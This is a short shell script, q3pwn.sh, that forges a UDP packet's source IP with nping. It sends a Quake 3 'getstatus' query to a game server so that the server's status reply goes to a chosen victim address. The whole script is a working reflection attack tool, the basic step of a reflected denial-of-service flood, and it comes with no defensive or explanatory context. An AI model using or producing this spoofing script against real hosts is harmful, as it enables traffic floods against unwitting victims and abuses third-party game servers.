#!/bin/sh
#
# q3pwn.sh <q3-ip> <q3-port> <target-ip> <target-port>
#
# Ask q3-ip:q3-port to send its status information to target-ip:target-port.
#
set -e

[ $# -eq 4 ] || exit 1

q3_ip=$1
q3_port=$2
target_ip=$3
target_port=$4

nping --udp                      \
      --count       1            \
      --dest-ip     $q3_ip       \
      --dest-port   $q3_port     \
      --source-ip   $target_ip   \
      --source-port $target_port \
      --data        "FFFFFFFF676574737461747573"

# eof
